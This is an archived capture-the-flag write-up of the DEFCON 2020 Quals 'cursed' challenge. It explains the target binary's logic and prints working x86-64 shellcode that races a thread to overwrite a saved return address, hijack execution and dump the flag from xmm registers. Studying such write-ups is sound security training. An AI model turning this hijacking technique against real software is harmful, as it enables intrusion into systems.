# cursed

**CTF:** DEFCON 2020 Quals  
**Category:** misc  
**Original writeup:** <https://mem2019.github.io/jekyll/update/2020/05/22/Defcon-Cursed-Blursed.html> — by **mem2019**. All credit goes to the original author; this is an archived copy.

---

0x03 Cursed

The logic of bozo.bin of cursed is described as below:

load flag into xmm0-xmm7 , set rbx = &shellcode_input + 0xff8 fill the buffer that contains flag using our shellcode (so reading flag directly is not possible) execute 16*8=128 similar code blocks In each block, a byte is fetched from xmm0-xmm7 , and then processed in some way, shown as blow: ; rbx == [input+0xff8] loc_3E: ; first block xor r8, r8 pextrb eax, xmm7, 0Fh ; load the a flag byte into al ; different blocks fetch different bytes cmpxchg [rbx], r8 ; if al == [rbx]: ; [rbx] = r8 ; break since ZF=0 ; else: ; al = [rbx] pause jnz short loc_3E call sub_BE8 In another word, it loads a flag byte into al , and compares it with [input+0xff8] . If they equal, set RWX+0xff8 to 0 and break; otherwise, continue the loop. At this point the idea is clear, we can change RWX+0xff8 from 0-255 in shellcode and see if the RWX+0xff8 is set to 0 . If so, that value is the correct flag byte, and we can print it and then try the next byte. However, the sub_BE8 is troublesome: sub_BE8 proc near mov rcx, 8 loc_BEF: xor rax, rax rdseed rax and rax, 0FFFh ; rax = rand([0:0xfff]) mov dword ptr [rsi+rax], 0FFFFFFFFh ; write to shellcode randomly dec rcx cmp rcx, 0 jg short loc_BEF retn sub_BE8 endp This function will write 0xffffffff to our shellcode, which might destroy the shellcode. It turns out that after 128+ calls, the probability for our shellcode to be unmodified is very low.

However, according to document of rdseed , it is possible for this instruction to return 0. If we can achieve this stably, we can bypass this shellcode destruction. When I was thinking about this, we found that challenge blursed has exactly same binary as cursed , and the crucial difference of bozo.bin is that call is replaced with a jmp which saves return address into r15 register. And this difference reminds me that I can simply write the return address of call to hijack the rip of bozo.bin thread to let it execute arbitrary code! No need to struggle with the flag process logic!

Therefore, the shellcode is pretty simple:

; ---------------- shellcode at the start of RWX page ---------------- call next next: pop rsi mov rdi,rsi add rdi,0x800-5 ; rdi = RWX page + 0x800 mov rbx,rsp sub rbx,0x10c8 ; rbx = address of saved rip ; because stack argument passed into `clone` ; is calculated using address of a local variable minus 1024 ; clone(read_flag_exec_bozo, **&v17 - 1024**, 0x18900LL, v5); ; 0x10c8 is found by debugging mov qword ptr [rsi-5+0xff8], 1 ; last byte is always \x01 due to padding ; so this breaks the loop and enters `call sub_BE8` loop: mov [rbx],rdi ; writing saved rip to RWX+0x800 in a loop jmp loop ; ---------------- shellcode at RWX page + 0x800 ---------------- call next next: pop rsi add rsi,0x100-5 movups [rsi],xmm0 movups [rsi+0x10],xmm1 movups [rsi+0x20],xmm2 movups [rsi+0x30],xmm3 movups [rsi+0x40],xmm4 movups [rsi+0x50],xmm5 movups [rsi+0x60],xmm6 movups [rsi+0x70],xmm7 ; write flag into memory mov rdi,1 mov rdx,0x40 mov rax,SYS_write ; print flag contents syscall

Due to race condition of thread, this does not always give the flag, but you will get the flag after several trials.
